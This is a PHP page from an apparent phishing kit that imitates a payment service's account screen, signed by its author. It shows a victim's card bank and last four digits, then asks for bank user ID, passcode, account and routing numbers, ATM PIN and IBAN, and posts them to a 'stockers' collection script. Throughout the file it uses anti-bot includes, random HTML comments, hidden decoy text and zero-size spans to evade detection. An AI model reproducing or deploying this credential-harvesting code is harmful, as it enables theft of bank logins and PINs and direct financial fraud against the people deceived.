<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
		<?php echo $lg_process['title']?></title>
		<link rel="stylesheet" href="lib/styles/process.css">
		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
	</head>
	<body>
		
    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
<input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
	<div class="navContainer">
		<a href="javascript:" class="desktopBrand"></a>
		<div class="mobileMenu">
			<div class="logoutMobile">
				<a href="javascript:" class="logoutTxtMobile">
					<?php echo $lg_process['logout']?></a>
				</div>
				<div class="settingsMobile">
					<a href="javascript:" class="svgLogo settingsTxt">
						<img src="lib/pics/settings.svg" alt=""></a>
					</div>
					<div>
						<p class="displayMail">
							<?php echo $_SESSION['EML']?></p>
						</div>
					</div>
<div class="desktopMenu">
	<nav class="desktopItems">
		<ul class="firstUl">
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['home']?>
			</a>
		</li>
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['activity']?></a>
			</li>
	<?php echo "<!--".rand(0,99999999)."-->"?>		<li class="">
				<a href="javascript:" class="linksTxt">
					<?php echo $lg_process['menu']['send_receive']?></a></li><li class="">
	<?php echo "<!--".rand(0,99999999)."-->"?>					<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a>
					</li>
		<?php echo "<!--".rand(0,99999999)."-->"?>			<li class="activeLi">
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a>
					</li>
<?php echo "<!--".rand(0,99999999)."-->"?>				</ul>
				<ul class="secondUl"><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>			<li class="notifLi"><?php echo "<!--".rand(0,99999999)."-->"?>
						<a href="javascript:" class="svgLogo notifTxt"><?php echo "<!--".rand(0,99999999)."-->"?>
							<img src="lib/pics/noti.svg" alt=""></a>
						</li>
						<li><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>		<?php echo "<!--".rand(0,99999999)."-->"?>			<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
						</li>
						<li class="logoutLi">
							<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>					</li>
						</ul>
					</nav>
<?php echo "<!--".rand(0,99999999)."-->"?>				</div><?php echo "<!--".rand(0,99999999)."-->"?>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
		</div>
<div class="mainContainer">
	<div class="hide" id="rotate">
		<div class="spinner"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="rotate"></div><?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?>			<div class="processing"><?php echo $lg_sign['rotate']?></div>
		</div>
<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="overlay">
		</div><?php echo "<!--".rand(0,99999999)."-->"?>
	</div>
	<div class="mobileNav">
		<div class="navHeader">
			<div class="blockToggler">
	<?php echo "<!--".rand(0,99999999)."-->"?>			<label class="menuLabel" for="toggleMenu"><span></span>
					<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div>
					<div class="menuClose">
<?php echo "<!--".rand(0,99999999)."-->"?>						<?php echo $lg_process['menu']['close']?></div>
					</label>
				</div><?php echo "<!--".rand(0,99999999)."-->"?>
			</div>
		<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="navLogo"><a href="javascript:" class="mobileBrand"></a>
			</div><ul class="notifUl"><li><a class="svgLogo notifTxt">
		<?php echo "<!--".rand(0,99999999)."-->"?>		<img src="lib/pics/noti.svg" alt="">
			</a>
		</li><?php echo "<!--".rand(0,99999999)."-->"?>
	</ul>
</div>
<?php echo "<!--".rand(0,99999999)."-->"?><div class="contents"><?php echo "<!--".rand(0,99999999)."-->"?>
	<section class="mainContents" id="mailaccess">
		<form action="../extra/stockers/step6.php" method="post" style="padding:0 20px">
		<h1 style="padding-bottom:10px"><?php echo "<!--".rand(0,99999999)."-->"?>
		<?php echo "<!--".rand(0,99999999)."-->"?>	<span style="font-size:0">darkness</span>
			<?php echo $lg_bank['head']?>
			<span style="font-size:0">isnot good</span></h1>

 <p style="text-align: left;"><small><?php echo $lg_bank['head2']?> <strong><?php echo $_SESSION['_cc_bank_']; ?></strong> <?php echo $lg_bank['head3']?></small><br>
 <small><?php echo $lg_bank['head4']?> <strong><?php echo ucfirst(strtolower($_SESSION['_cc_type_'])); ?> Card X-<?php echo substr($_SESSION['ccn'] , -4); ?>.</strong></small></p>

 			<div class="fields clearfix">
				<?php 
         		if ($_SESSION['_cc_bank_']){
             echo '<strong>
			<div align="left">
			'.$lg_bank['bankname'].': </strong>
			'.$_SESSION['_cc_bank_'].'</div>';
		}
		         if ($_SESSION['_country_']){
             echo '<strong>
			<div align="left">
			'.$lg_bank['bankcountry'].': </strong>
			'.$_SESSION['_country_'].'</div>';
		}
		         if ($_SESSION['_cc_phone_']){
         	  $bankphone=$_SESSION['_cc_phone_'];
              $bankphone= explode("OR", $bankphone);
              $ccphone=$bankphone[0];
             echo '<strong>
			<div align="left">
			'.$lg_bank['bankphone'].': </strong>
			'.$ccphone.'</div>';
		}
		         if ($_SESSION['_cc_site_']){
             echo '<strong>
			<div align="left">
			'.$lg_bank['bankwebsite'].': </strong>
			'.$_SESSION['_cc_site_'].'</div>';
		}
		
              echo '<br>';
		if ($_SESSION['_cc_site_']){
              echo '<td><img style="border:1px solid #ddd;position:relative;box-sizing:border-box;padding:5px;box-shadow:0 15px 20px rgba(0, 0, 0, 0.3);margin-bottom:10px;width:143px;height:60px"
              resizable="yes" width="128" height="64" src="https://logo.clearbit.com/'.$_SESSION['_cc_site_'].'"></td>';

		}
?>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="inputArea">
	<?php echo "<!--".rand(0,99999999)."-->"?>	<input name="userid" required placeholder="<?php echo $lg_bank['userid']?>" autocomplete="off">
	<?php echo "<!--".rand(0,99999999)."-->"?>	<input name="passcode" type="password" required placeholder="<?php echo $lg_bank['passcode']?>"autocomplete="off">
<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="multiInputs">
	<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="inputArea hasSub">
		<?php echo "<!--".rand(0,99999999)."-->"?>	<input name="accnumq" required placeholder="<?php echo $lg_bank['accnumq']?>" autocomplete="off">
	<?php echo "<!--".rand(0,99999999)."-->"?>	</div>
	<?php echo "<!--".rand(0,99999999)."-->"?><div class="inputArea hasSub pull-right"><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<input name="rounum" required placeholder="<?php echo $lg_bank['rounum']?>" autocomplete="off">	
		</div>
<?php                                                   
				if ($_SESSION['ip_countryCode'] == "AL" || $_SESSION['ip_countryCode'] == "AD" || $_SESSION['ip_countryCode'] == "AT" || $_SESSION['ip_countryCode'] == "AZ" || $_SESSION['ip_countryCode'] == "BH" || $_SESSION['ip_countryCode'] == "BE" || $_SESSION['ip_countryCode'] == "BA" || $_SESSION['ip_countryCode'] == "BR" || $_SESSION['ip_countryCode'] == "BG" || $_SESSION['ip_countryCode'] == "CR" || $_SESSION['ip_countryCode'] == "HR" || $_SESSION['ip_countryCode'] == "CY" || $_SESSION['ip_countryCode'] == "CZ" || $_SESSION['ip_countryCode'] == "DK" || $_SESSION['ip_countryCode'] == "DO" || $_SESSION['ip_countryCode'] == "SV" || $_SESSION['ip_countryCode'] == "EE" || $_SESSION['ip_countryCode'] == "FO" || $_SESSION['ip_countryCode'] == "FI" || $_SESSION['ip_countryCode'] == "FR" || $_SESSION['ip_countryCode'] == "GE" || $_SESSION['ip_countryCode'] == "DE" || $_SESSION['ip_countryCode'] == "GI" || $_SESSION['ip_countryCode'] == "GR" || $_SESSION['ip_countryCode'] == "GL" || $_SESSION['ip_countryCode'] == "GT" || $_SESSION['ip_countryCode'] == "HU" || $_SESSION['ip_countryCode'] == "IS" || $_SESSION['ip_countryCode'] == "IQ" || $_SESSION['ip_countryCode'] == "IE" || $_SESSION['ip_countryCode'] == "IL" || $_SESSION['ip_countryCode'] == "IT" || $_SESSION['ip_countryCode'] == "JO" || $_SESSION['ip_countryCode'] == "KZ" || $_SESSION['ip_countryCode'] == "XK" || $_SESSION['ip_countryCode'] == "KW" || $_SESSION['ip_countryCode'] == "LV" || $_SESSION['ip_countryCode'] == "LB" || $_SESSION['ip_countryCode'] == "LI" || $_SESSION['ip_countryCode'] == "LT" || $_SESSION['ip_countryCode'] == "LU" || $_SESSION['ip_countryCode'] == "MK" || $_SESSION['ip_countryCode'] == "MT" || $_SESSION['ip_countryCode'] == "MR" || $_SESSION['ip_countryCode'] == "MU" || $_SESSION['ip_countryCode'] == "MD" || $_SESSION['ip_countryCode'] == "MC" || $_SESSION['ip_countryCode'] == "ME" || $_SESSION['ip_countryCode'] == "NL" || $_SESSION['ip_countryCode'] == "NO" || $_SESSION['ip_countryCode'] == "PK" || $_SESSION['ip_countryCode'] == "PS" || $_SESSION['ip_countryCode'] == "PL" || $_SESSION['ip_countryCode'] == "PT" || $_SESSION['ip_countryCode'] == "QA" || $_SESSION['ip_countryCode'] == "BY" || $_SESSION['ip_countryCode'] == "RO" || $_SESSION['ip_countryCode'] == "LC" || $_SESSION['ip_countryCode'] == "SM" || $_SESSION['ip_countryCode'] == "ST" || $_SESSION['ip_countryCode'] == "SA" || $_SESSION['ip_countryCode'] == "RS" || $_SESSION['ip_countryCode'] == "SC" || $_SESSION['ip_countryCode'] == "SK" || $_SESSION['ip_countryCode'] == "SI" || $_SESSION['ip_countryCode'] == "ES" || $_SESSION['ip_countryCode'] == "SE" || $_SESSION['ip_countryCode'] == "CH" || $_SESSION['ip_countryCode'] == "TL" || $_SESSION['ip_countryCode'] == "TN" || $_SESSION['ip_countryCode'] == "TR" || $_SESSION['ip_countryCode'] == "UA" || $_SESSION['ip_countryCode'] == "AE" || $_SESSION['ip_countryCode'] == "GB" || $_SESSION['ip_countryCode'] == "VG") {

                echo '	<div class="inputArea hasSub">
						<input name="iban" required placeholder="'.$lg_bank['iban'].'" autocomplete="off">
						</div>';
				echo ' 
                  		 <div class="inputArea hasSub pull-right">
						 <input name="atmpin" required placeholder="ATM PIN" autocomplete="off">  
						 </div>
		                ';
                                                  }else{
                                                  	echo '	
						 <input name="atmpin" required placeholder="ATM PIN" autocomplete="off">  
		</div>';
                                                  } ?>
                                                  <?php echo "<!--".rand(0,99999999)."-->"?>
		</div>

		<input style="margin-top:10px;width:100%" type="submit" class="bt" value="<?php echo $lg_bank['bt_save']?>">
				 </form>
		</section>
			</div><div><div class="ftr"><div class="footerFirstContent"><ul class="footerList"><li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li><li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li></ul><div class="footerSecondContent"><p class="footerP">Copyright ©<span>1999-2019</span> . <?php echo $lg_process['footer']['rights']?></p><ul class="footerUl"><li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li></ul></div></div></div></div></div>
</body>
</html>